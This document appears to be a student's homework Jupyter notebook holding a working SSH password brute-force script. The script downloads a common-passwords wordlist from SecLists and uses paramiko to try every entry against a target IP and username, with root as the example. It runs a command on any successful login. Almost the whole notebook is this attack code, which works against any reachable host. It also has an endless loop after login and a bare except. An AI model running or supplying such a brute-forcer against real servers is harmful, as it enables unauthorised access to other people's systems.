{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "When running in the terminal, do:\n",
    "    python3 klepikhina-HW1.py 10.0.0.1 root"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import sys\n",
    "import urllib.request\n",
    "import paramiko\n",
    "import argparse"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# os.system(\"curl -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10k_most_common.txt\")\n",
    "url = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10k_most_common.txt'\n",
    "page = urllib.request.urlretrieve(url, \"10k_most_common.txt\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "if len(sys.argv) < 3:\n",
    "    print(\"Must specify IP of target and username like so:  python3 klepikhina-HW1.py IP_of_target username\")\n",
    "    sys.exit(0)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "usage: ipykernel_launcher.py [-h] IP user\n",
      "ipykernel_launcher.py: error: the following arguments are required: user\n"
     ]
    },
    {
     "ename": "SystemExit",
     "evalue": "2",
     "output_type": "error",
     "traceback": [
      "An exception has occurred, use %tb to see the full traceback.\n",
      "\u001b[0;31mSystemExit\u001b[0m\u001b[0;31m:\u001b[0m 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/home/klepikhina/anaconda3/lib/python3.6/site-packages/IPython/core/interactiveshell.py:2870: UserWarning: To exit: use 'exit', 'quit', or Ctrl-D.\n",
      "  warn(\"To exit: use 'exit', 'quit', or Ctrl-D.\", stacklevel=1)\n"
     ]
    }
   ],
   "source": [
    "parser = argparse.ArgumentParser()\n",
    "\n",
    "parser.add_argument(\"IP\", help=\"IP of target\")\n",
    "parser.add_argument(\"user\", help=\"username\")\n",
    "\n",
    "args = parser.parse_args()\n",
    "IP = args.IP\n",
    "user = args.user"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "client = paramiko.SSHClient()\n",
    "client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n",
    "with open('/home/klepikhina/Documents/Homework/10k_most_common.txt') as f:\n",
    "    data = f.readlines()\n",
    "    for pw in data:\n",
    "        print(pw[:-1])\n",
    "        try:\n",
    "#             client.connect('10.0.2.15', username='root', password=pw[:-1])\n",
    "#             client.connect(str(sys.argv[1]), username=str(sys.argv[2]), password=pw[:-1])\n",
    "            client.connect(IP, username=user, password=pw[:-1])\n",
    "            while True:\n",
    "                ssh_session = client.get_transport().open_session()\n",
    "                if ssh_session.active:\n",
    "                    ssh_session.exec_command('df -h')\n",
    "                    print(ssh_session.recv(1024))\n",
    "                    print('The password ' + pw[:-1] + ' is weak.')\n",
    "                \n",
    "            exit(0)\n",
    "        except:\n",
    "            print(\"Failed to connect.\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
